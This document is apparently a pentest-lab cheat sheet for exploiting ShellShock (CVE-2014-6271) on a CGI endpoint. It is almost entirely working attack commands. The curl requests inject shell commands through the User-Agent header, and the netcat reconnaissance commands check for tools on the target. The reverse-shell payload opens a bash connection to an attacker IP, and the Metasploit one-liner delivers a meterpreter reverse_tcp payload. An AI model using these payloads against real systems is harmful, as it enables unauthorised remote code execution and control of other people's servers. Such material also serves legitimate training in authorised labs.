# ShellShock

PoC: `'() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id`
After: `'User-Agent: () { :; }; echo "CVE-2014-6271 vulnerable" bash -c id'`

1. Exploit manually

    ```bash
    curl -H 'User-Agent: () { :; }; echo "CVE-2014-6271 vulnerable" bash -c id' http://10.11.1.71/cgi-bin/admin.cgi
    curl -H "User-Agent: () { :; }; set" http://10.11.1.71/cgi-bin/admin.cgi
    curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; uname -a; echo zzzz;'" http://10.11.1.71/cgi-bin/admin.cgi
    curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa;  ${cmd}; echo zzzz;'" http://10.11.1.71/cgi-bin/admin.cgi -s \
    | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
    cmd="hostname -f"
    !curl
    ```

2. Commands to try

    ```bash
    whereis nc
    nc -h
    nc -h 2>&1
    dpkg -l | grep netcat
    find / -name 'nc.*' -type f
    ```

    Get VPN IP
    ```bash
    ip addr show dev tap0
    ```

    Get a **reverse shell**
    ```bash
    curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa;  bash -i >& /dev/tcp/10.11.0.4/443 0>&1; echo zzzz;'" http://10.11.1.71/cgi-bin/admin.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
    ```

3. Using Metasploit

    ```bash
    msfconsole -q -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOST 10.11.1.71; set TARGETURI /cgi-bin/admin.cgi; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.11.0.4; set LPORT 443; run;"
    ```

## References

* https://forums.offensive-security.com/showthread.php?27949-Offensive-Security-s-Complete-Guide-to-Alpha/page2
* https://www.exploit-db.com/exploits/34900